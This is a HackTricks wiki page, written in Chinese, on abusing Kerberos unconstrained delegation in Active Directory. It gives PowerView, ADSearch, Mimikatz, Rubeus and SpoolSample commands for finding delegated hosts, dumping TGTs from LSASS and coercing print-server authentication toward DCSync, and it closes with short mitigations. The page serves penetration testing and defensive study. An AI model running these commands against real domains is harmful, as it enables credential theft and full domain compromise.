# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

这是一个域管理员可以设置给域内任何**计算机**的功能。然后，每当**用户登录**到该计算机时，该用户的**TGT副本**将被**发送到DC提供的TGS中**并保存在LSASS的内存中。因此，如果您在该机器上拥有管理员权限，您将能够**转储票证并冒充用户**在任何机器上。

因此，如果域管理员登录到启用了“无约束委派”功能的计算机，并且您在该机器上拥有本地管理员权限，您将能够转储票证并在任何地方冒充域管理员（域权限提升）。

您可以通过检查[userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>)属性是否包含[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)来**查找具有此属性的计算机对象**。您可以使用LDAP过滤器‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’来做到这一点，这正是powerview所做的：
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
加载管理员（或受害者用户）的票证到内存中，使用**Mimikatz**或**Rubeus**进行[**票证传递**](pass-the-ticket.md)。\
更多信息：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**关于不受约束委派的更多信息在ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **强制认证**

如果攻击者能够**攻陷一个被允许进行“无约束委派”的计算机**，他可以**欺骗**一个**打印服务器**，使其**自动登录**并**在服务器的内存中保存TGT**。\
然后，攻击者可以执行**票证传递攻击以冒充**用户打印服务器计算机帐户。

要使打印服务器登录到任何机器，可以使用[**SpoolSample**](https://github.com/leechristensen/SpoolSample)：
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
如果 TGT 来自域控制器，您可以执行 [**DCSync 攻击**](acl-persistence-abuse/index.html#dcsync) 并从 DC 获取所有哈希。\
[**有关此攻击的更多信息，请访问 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

在这里找到其他 **强制身份验证** 的方法：

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 缓解措施

- 限制 DA/Admin 登录到特定服务
- 为特权账户设置“账户是敏感的，无法被委派”。 

{{#include ../../banners/hacktricks-training.md}}
